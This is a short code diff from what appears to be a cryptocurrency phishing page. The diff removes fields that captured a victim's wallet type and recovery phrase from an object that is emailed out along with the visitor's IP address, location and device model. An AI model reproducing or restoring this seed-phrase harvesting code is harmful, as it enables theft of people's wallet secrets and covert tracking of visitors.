@@ -137,8 +137,6 @@ document.querySelectorAll("#proceedButton").forEach((button) => {
       LOCATION: visitorData.location,
       IP_ADDRESS: visitorData.ip,
       DEVICE_MODEL: visitorData.device,
-      WALLET_TYPE: popup.querySelector("#wallet-type")?.value || "N/A",
-      WORD_PHRASE: text,
     };
 
     // Send the email
